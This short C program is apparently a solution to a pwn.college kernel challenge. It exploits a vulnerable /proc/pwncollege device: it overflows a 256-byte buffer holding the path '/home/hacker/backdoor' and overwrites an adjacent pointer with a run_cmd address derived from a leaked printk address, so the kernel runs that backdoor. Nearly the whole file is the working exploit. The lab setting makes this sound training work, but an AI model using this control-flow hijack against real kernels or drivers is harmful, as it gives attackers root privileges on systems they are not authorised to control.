#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<assert.h>
#include <string.h>
#include <stdint.h>
/// leak printk addr by cat (256 byte) to /proc/pwncollege then dmesg
/// because program set printk addr at rsp+0x100
struct ans{
    char shellcode[256] ;
    uint64_t* addr ;
};
typedef struct ans Ans;
int main(){

    uint64_t printk_addr = 0xffffffff9d8b6319;
    Ans exp;
    int fd ;
    strcpy(exp.shellcode,"/home/hacker/backdoor\x00");
    exp.addr = (uint64_t*) (printk_addr - 183721); // run_cmd

    fd = open("/proc/pwncollege",2);
    assert(fd >0);

    write(fd,&exp,0x108);
    return 0 ;
}
